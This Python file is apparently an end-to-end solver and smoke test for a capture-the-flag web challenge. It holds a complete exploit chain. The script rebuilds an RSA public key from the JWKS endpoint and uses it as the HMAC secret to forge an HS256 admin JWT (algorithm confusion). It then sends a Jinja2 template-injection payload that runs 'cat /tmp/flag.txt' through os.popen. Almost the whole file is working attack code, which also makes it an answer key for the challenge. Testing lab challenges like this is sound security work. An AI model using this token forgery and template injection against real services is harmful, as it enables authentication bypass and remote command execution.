#!/usr/bin/env python3
"""
web-token-ghost end-to-end smoke test.
Path: JWKS -> rebuild RSA public PEM -> forge HS256 admin token (alg confusion)
-> /api/admin/reports SSTI -> read /tmp/flag.txt.
Exit 0 = PASS.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import sys

import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10004").rstrip("/")


def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_enc(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256(payload, secret):
    header = {"alg": "HS256", "typ": "JWT", "kid": "key-001"}
    h = b64url_enc(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_enc(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_enc(sig)}"


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def solve():
    jwks = requests.get(f"{TARGET}/api/.well-known/jwks.json", timeout=10).json()
    k = jwks["keys"][0]
    n = int.from_bytes(b64url_decode(k["n"]), "big")
    e = int.from_bytes(b64url_decode(k["e"]), "big")
    pem = RSAPublicNumbers(e, n).public_key(default_backend()).public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    token = forge_hs256(
        {"sub": "1", "role": "admin", "username": "admin", "exp": 9999999999}, pem
    )
    payload = "{{lipsum.__globals__['os'].popen('cat /tmp/flag.txt').read()}}"
    r = requests.get(
        f"{TARGET}/api/admin/reports",
        params={"template": payload},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    return (r.json().get("rendered", "") or "").strip()


def main():
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
